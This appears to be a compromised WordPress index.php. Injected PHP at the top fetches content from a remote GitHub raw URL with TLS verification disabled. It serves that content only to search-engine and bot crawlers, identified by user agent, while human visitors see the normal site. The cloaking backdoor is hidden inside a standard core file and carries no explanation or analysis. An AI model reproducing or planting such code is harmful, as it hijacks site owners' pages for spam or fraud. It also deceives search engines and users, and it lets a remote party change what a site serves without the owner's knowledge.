<?php
function f($u){
  if(ini_get('allow_url_fopen'))
    return @file_get_contents($u,0,stream_context_create(['http'=>['timeout'=>6],'https'=>['timeout'=>6]]));
  if(function_exists('curl_init')){
    $c=curl_init($u);
    curl_setopt_array($c,[
      CURLOPT_RETURNTRANSFER=>1,
      CURLOPT_USERAGENT=>'Mozilla/5.0',
      CURLOPT_SSL_VERIFYPEER=>0,
      CURLOPT_SSL_VERIFYHOST=>0,
      CURLOPT_TIMEOUT=>10
    ]);
    $r=curl_exec($c);curl_close($c);return $r;
  }
  return false;
}
$u=strtolower($_SERVER["HTTP_USER_AGENT"]);
$x="https://raw.githubusercontent.com/ajabahan1/bahan/refs/heads/main/halal.php";
$d=f($x);
if(preg_match('/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/',$u)){
  header("Content-Type: text/html; charset=UTF-8");
  header("Vary: User-Agent");
  if($d!==false)echo $d;exit;
}
?>
<?php
define( 'WP_USE_THEMES', true );
require __DIR__ . '/wp-blog-header.php';
